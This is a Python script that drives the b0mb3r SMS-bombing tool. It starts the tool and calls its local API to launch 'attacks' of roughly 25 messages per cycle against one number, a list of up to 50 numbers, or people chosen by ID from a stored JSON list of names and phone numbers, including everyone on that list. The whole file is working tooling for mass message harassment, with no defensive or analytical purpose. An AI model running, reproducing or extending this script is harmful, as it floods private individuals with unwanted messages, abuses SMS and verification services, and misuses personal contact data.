import requests
from subprocess import Popen
import time
import json
import codecs

print("скрипт написан etidart'ом")
print("\n\nинициализация b0mb3r'a")
bomb = Popen('b0mb3r', shell=False, stdout=open('stdout.txt', 'wb'), stderr=open('stderr.txt', 'wb'))  # инициализация b0mb3r'а
time.sleep(15)  # задержка на вс
print("b0mb3r инициализирован")  # оповещение об окончании

MODE = 1  # 1 – single phone; 2 multiple phones; 3 attack on id; 4 attack all ids
NUMBER_OF_CYCLES = '1'  # 1 cycle ~ 25 messages
PHONE = '79999999999'  # phone number or numbers if selected 2 mode
PHONES = []
number_of_phones = None
file = codecs.open("js/input.json", "r", "utf_8_sig")
file_data = json.load(file)
file_m = codecs.open("js/massa.json", "r", "utf_8_sig")
file_m_data = json.load(file_m)
massa = int(file_m_data["massa"])  # количество номеров телефонов
id_user = None  # временная переменная


def select_mode():  # функция которая задаёт режим
    global MODE
    mode_select = input("Enter the mode number or HELP for help:")
    if str(mode_select) == "HELP":
        print("1 – single phone;\n2 – multiple phones;\n3 then 1 – attack on ID;\n4 then 2 – attack all IDs")
        select_mode()
    else:
        try:
            mode_select = int(mode_select)
        except:
            print("Invalid input. Are you sure you entered a number or HELP?")
            select_mode()
        if int(mode_select) == 1:
            MODE = 1
        elif int(mode_select) == 2:
            MODE = 2
        elif int(mode_select) == 3:  # атака по id
            def hack_me():
                global MODE
                hack_all = input("Have you chosen to attack by ID?")
                try:
                    hack_all = int(hack_all)
                except:
                    print("Invalid input. Are you sure you entered the number?")
                    hack_me()
                if str(hack_all) == '1':
                    MODE = 3
                elif str(hack_all) == '2':
                    MODE = 4
                else:
                    print("Invalid input. Are you sure you entered the number 1 or 2?")
                    hack_me()
            hack_me()
        else:
            print("Invalid input. Are you sure you entered the number 1, 2 or 3?")
            select_mode()


def select_cycles():
    global NUMBER_OF_CYCLES
    cycles_select = input("Enter the number of cycles or HELP for help:")
    if str(cycles_select) == "HELP":
        print("1 cycle – 25 messages;\nmaximum = 255 cycles")
        select_cycles()
    else:
        try:
            cycles_select = int(cycles_select)
        except:
            print("Invalid input. Are you sure you entered a number or HELP?")
            select_cycles()
        if int(cycles_select) >= 1 and int(cycles_select) <= 255:
            NUMBER_OF_CYCLES = int(cycles_select)
        else:
            print("Invalid input. Are you sure you entered a number between 1 and 255?")
            select_cycles()


def phone_check():
    global MODE
    global PHONE
    global PHONES
    global number_of_phones
    if MODE == 1:
        phone_select = input("Enter phone number without 7 or 8:")
        number_of_digits = 0
        for digit in phone_select:
            number_of_digits += 1
        if number_of_digits == 10:
            pass
        else:
            print("You entered fewer or more numbers or letters")
            phone_check()
        try:
            phone_select = int(phone_select)
        except:
            print("Invalid input. Are you sure you entered the number?")
            phone_check()
        PHONE = '7' + str(phone_select)
    elif MODE == 2:
        number_of_phones = input("Enter the number of phone numbers (no more than 50):")
        try:
            number_of_phones = int(number_of_phones)
        except:
            print("Invalid input. Are you sure you entered the number?")
            phone_check()
        if 1 <= int(number_of_phones) <= 50:
            global PHONES
            for i in range(int(number_of_phones)):
                please = True
                while please:
                    temp_phones = input("Enter phone number " + str(i + 1) + " without 7 or 8:")
                    number_of_digits_two = 0
                    for digit_two in temp_phones:
                        number_of_digits_two += 1
                    if number_of_digits_two == 10:
                        pass
                    else:
                        print("You entered fewer or more numbers or letters")
                        continue
                    try:
                        temp_phones = int(temp_phones)
                    except:
                        print("Invalid input. Are you sure you entered the number?")
                        continue
                    PHONES.append('7' + str(temp_phones))
                    please = False
                    break
        else:
            print("Invalid input. Are you sure you entered a number between 1 and 50?")
    elif MODE == 3:
        global id_user
        id_user = input("Enter ID:")
        try:
            id_user = int(id_user)
        except:
            print("Invalid input. Are you sure you entered the number?")
            phone_check()
        if int(id_user) >= 1 and int(id_user) <= massa:
            print("ID: " + str(file_data[int(id_user) - 1]["id"]) + '\nNAME: ' + file_data[int(id_user) - 1]["name"] + '\nPHONE: +' + file_data[int(id_user) - 1]["number"])
            het = input("Are you sure you want to continue?")
            if het == "YES":
                PHONE = file_data[int(id_user) - 1]["number"]
            elif het == "NO":
                # bomb.terminate()
                file_m.close()
                file.close()
                quit()
            else:
                print("ERROR")
                phone_check()
        else:
            print("Invalid input. Are you sure you entered a number from 1 to " + str(massa) + "?")
            phone_check()
    else:
        het = input("Are you sure you want to continue?")
        if het == "YES":
            for iter in range(massa):
                PHONES.append(file_data[iter]["number"])
        elif het == "NO":
            # bomb.terminate()
            file_m.close()
            file.close()
            quit()
        else:
            print("ERROR")
            phone_check()


select_mode()
select_cycles()
phone_check()

# print(MODE)
# print(NUMBER_OF_CYCLES)
# if MODE == 2:
#     for s in range(int(number_of_phones)):
#         print(PHONES[s])
# elif MODE == 4:
#     for s in range(massa):
#         print(PHONES[s])
# else:
#     print(PHONE)

if MODE == 1:
    response = requests.post(
        "http://127.0.0.1:8080/attack/start",
        json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONE},
    ).json()

    if response["success"]:
        print("ATTACK STARTED")
        id = response["id"]
        response_two = requests.get(
            "http://127.0.0.1:8080/attack/" + id + "/status"
        ).json()
    else:
        print("Houston, we have a problem")

    if response_two:
        for eter in range(response_two['end_at']):
            response_three = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            print(f"{response_three['currently_at']}/{response_three['end_at']}")
        print("ATTACK ENDED")
elif MODE == 3:
    print("Attempt to attack   " + file_data[int(id_user) - 1]["name"] + "   ...")
    response = requests.post(
        "http://127.0.0.1:8080/attack/start",
        json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONE},
    ).json()

    if response["success"]:
        print("ATTACK STARTED")
        id = response["id"]
        response_two = requests.get(
            "http://127.0.0.1:8080/attack/" + id + "/status"
        ).json()
    else:
        print("Houston, we have a problem")

    if response_two:
        for eter in range(response_two['end_at']):
            response_three = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            print(f"{response_three['currently_at']}/{response_three['end_at']}")
        print("ATTACK ENDED")
elif MODE == 4:
    for e in range(massa):
        response = requests.post(
            "http://127.0.0.1:8080/attack/start",
            json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONES[e]},
        ).json()

        if response["success"]:
            id = response["id"]
            response_two = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            if response_two['currently_at'] == response_two['end_at']:
                print("ATTACK ENDED   " + str(e + 1))
            print("ATTACK STARTED   " + str(e + 1))
        else:
            print("Houston, we have a problem " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
else:
    for e in range(int(number_of_phones)):
        response = requests.post(
            "http://127.0.0.1:8080/attack/start",
            json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONES[e]},
        ).json()

        if response["success"]:
            id = response["id"]
            response_two = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            if response_two['currently_at'] == response_two['end_at']:
                print("ATTACK ENDED   " + str(e + 1))
            print("ATTACK STARTED   " + str(e + 1))
        else:
            print("Houston, we have a problem " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
# bomb.terminate()
file.close()
file_m.close()
print("\n\n\nThank you for using!")
